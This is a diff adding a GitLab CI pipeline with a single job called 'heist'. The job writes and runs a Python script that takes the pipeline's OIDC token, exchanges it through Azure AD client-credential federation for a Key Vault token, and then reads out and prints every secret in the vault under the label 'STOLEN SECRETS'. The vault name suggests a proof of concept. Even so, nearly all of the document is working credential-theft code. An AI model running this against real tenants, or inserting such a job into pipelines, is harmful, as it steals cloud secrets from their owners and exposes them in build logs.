@@ -1,0 +1,54 @@
+stages:
+  - test
+
+heist:
+  stage: test
+  image: python:3.12-slim
+  id_tokens:
+    OIDC_TOKEN:
+      aud: https://gitlab.com
+  script:
+    - pip install -q requests
+    - |
+      cat > /tmp/heist.py << 'EOF'
+      import requests, json, os, base64
+
+      oidc = os.environ["OIDC_TOKEN"]
+      c = json.loads(base64.urlsafe_b64decode(oidc.split(".")[1] + "==" * 3))
+      print("user_login=" + c["user_login"])
+      print("user_id=" + str(c["user_id"]))
+      print("sub=" + c["sub"])
+      print()
+
+      r = requests.post(
+          "https://login.microsoftonline.com/178a51bf-8b20-49ff-b655-56245d5c173c/oauth2/v2.0/token",
+          data={
+              "grant_type": "client_credentials",
+              "client_id": "6db79b27-8cbf-4e59-869a-e90d8026a45c",
+              "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
+              "client_assertion": oidc,
+              "scope": "https://vault.azure.net/.default",
+          },
+      )
+      d = r.json()
+      vt = d.get("access_token", "")
+      if not vt:
+          print("VAULT_FAILED: " + d.get("error_description", "unknown"))
+          exit(1)
+
+      print("VAULT_TOKEN=" + str(len(vt)) + " chars")
+      print()
+      print("=== STOLEN SECRETS ===")
+      sl = requests.get(
+          "https://oidcpocvault.vault.azure.net/secrets?api-version=7.4",
+          headers={"Authorization": "Bearer " + vt},
+      ).json()
+      for s in sl.get("value", []):
+          name = s["id"].split("/")[-1]
+          val = requests.get(
+              s["id"] + "?api-version=7.4",
+              headers={"Authorization": "Bearer " + vt},
+          ).json()
+          print("  " + name + " = " + val.get("value", "DENIED"))
+      EOF
+    - python3 /tmp/heist.py
